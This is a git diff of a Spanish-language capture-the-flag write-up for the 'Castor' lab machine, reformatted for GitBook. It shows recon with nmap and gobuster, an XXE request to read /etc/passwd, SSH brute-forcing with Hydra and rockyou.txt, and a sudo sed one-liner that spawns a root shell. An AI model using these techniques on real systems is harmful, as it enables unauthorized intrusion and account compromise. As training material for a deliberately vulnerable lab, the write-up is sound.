@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Castor 
+---
+icon: linux
+---
 
-**Plataforma:** The Hackers Labs  
-**Sistema Operativo:** Linux  
+# Castor ​​
+
+## 🖥️ Writeup - Castor
+
+**Plataforma:** The Hackers Labs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `XXE` `Burp Suite` `Hydra` `Sudoers` `Information Leakage`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el archivo `zip` que contiene la `.ova` de la máquina Castor, lo extraemos y la importamos en VirtualBox.
 
 Configuramos la interfaz de red de la máquina Castor y la iniciamos junto a nuestra máquina atacante.
 
-# RECONOCIMIENTO DE HOSTS
+## RECONOCIMIENTO DE HOSTS
 
 En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -34,19 +42,20 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
 
 Identificamos con seguridad que la `IP` de la víctima es `10.0.4.40`.
 
-# ESCANEO DE PUERTOS    
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.40
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p21,80,139,445 --min-rate 5000 10.0.4.40
 ```
 
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-26 03:34 +0100
 Nmap scan report for 10.0.4.40
@@ -71,11 +80,11 @@ Identificamos los puertos `22` (SSH) y `80` (HTTP) abiertos.
 
 Accedemos al servicio web del puerto `80` y encontramos la siguiente página.
 
-![alt text](../../images/castor.png)
+![alt text](../../.gitbook/assets/castor.png)
 
 A primera vista, no localizamos información relevante que nos sugiera un vector de ataque claro.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -84,6 +93,7 @@ gobuster dir -u http://10.0.4.40 -w /usr/share/seclists/Discovery/Web-Content/Di
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -118,11 +128,11 @@ xml not provided
 
 Esto nos indica que el servidor espera recibir datos en formato `XML`.
 
-# EXPOTACIÓN XXE
+## EXPOTACIÓN XXE
 
 Interceptamos la petición con `Burp Suite`.
 
-![alt text](../../images/requestcastor.png)
+![alt text](../../.gitbook/assets/requestcastor.png)
 
 La enviamos al `Repeater` con `Ctrl + R` para realizar pruebas.
 
@@ -132,11 +142,12 @@ Dado que el sistema solicita una entrada `XML`, sospechamos que podría ser vuln
 
 Para comprobarlo, cambiamos el método de `GET` a `POST` y añadimos la cabecera `Content-Type: application/xml`.
 
-Por último, inyectamos un payload `XML` malicioso que define una entidad externa `&xxe;` apuntando al archivo local `/etc/passwd`. 
+Por último, inyectamos un payload `XML` malicioso que define una entidad externa `&xxe;` apuntando al archivo local `/etc/passwd`.
 
 Al procesar el `XML`, el servidor sustituye la entidad por el contenido del archivo solicitado.
 
 Petición:
+
 ```xml
 POST /upload.php HTTP/1.1
 Host: 10.0.4.40
@@ -157,13 +168,13 @@ Content-Length: 145
 </root>
 ```
 
-![alt text](../../images/burpcastor.png)
+![alt text](../../.gitbook/assets/burpcastor.png)
 
 ¡Ha funcionado! El servidor ha procesado el `XML` correctamente y nos ha devuelto el contenido del archivo `/etc/passwd`.
 
 Observamos que existe un usuario en el sistema llamado `castorcin`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Procedemos a realizar un ataque de fuerza bruta con el usuario castorcin contra el servicio `SSH` utilizando `Hydra`.
 
@@ -172,6 +183,7 @@ hydra -l castorcin -P /usr/share/wordlists/rockyou.txt ssh://10.0.4.40 -t 50
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -192,7 +204,7 @@ Accedemos mediante `SSH`.
 ssh castorcin@10.0.4.40
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Comprobamos permisos `sudo` y `SUID`.
 
@@ -201,6 +213,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for castorcin on TheHackersLabs-Castor:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -216,6 +229,7 @@ sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
 ```
 
 Info:
+
 ```
 sudo: unable to resolve host TheHackersLabs-Castor: Nombre o servicio desconocido
 # whoami
